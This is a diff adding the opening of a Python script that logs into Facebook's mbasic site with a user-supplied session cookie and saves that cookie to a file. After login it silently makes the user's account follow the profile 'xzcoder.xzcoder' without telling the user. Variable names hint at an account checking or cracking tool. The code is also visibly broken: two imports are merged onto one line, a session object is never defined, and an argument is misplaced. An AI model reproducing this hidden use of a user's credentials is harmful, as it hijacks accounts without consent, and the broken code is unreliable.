@@ -1,0 +1,36 @@
+import os,sys,time,requests,json,re
+from bs4 import BeautifulSoup as parser                 from time import sleep
+from concurrent.futures import ThreadPoolExecutor
+from colorama import init, Fore, Back
+id=[]
+count=0
+result=0
+chek=0
+die=0
+check=[]
+vuln=[]
+mbasic="https://mbasic.facebook.com{}"
+def masuk():
+    try:
+          cek = open("cookies").read()
+    except FileNotFoundError:
+          cek = input("\033[00mCookies : \033[1;96m")
+    cek = {"cookie":cek}
+    ismi = ses.get(mbasic.format("/me",verify=False),cookies=cek).content
+    if "mbasic_logout_button" in str(ismi):
+        if "test program hehe" in str(ismi):
+            with open("cookies","w") as f:
+                 f.write(cek["cookie"])
+        else:
+            try:
+                 requests.get(mbasic.format(parser(ismi,"html.parser").find("a",string="Bahasa Indonesia")["href"]),cookies=cek)
+            except:
+                 pass
+        try:
+             ikuti = parser(requests.get(mbasic.format("/xzcoder.xzcoder"),cookies=cek).content,"html.parser").find("a",string="Ikuti")["href"]
+             ses.get(mbasic.format(ikuti),cookies=cek)
+        except:
+             pass
+        return cek["cookie"]
+    else:
+        print('\033[00mCookies \033[91mInvalid\033[00m')
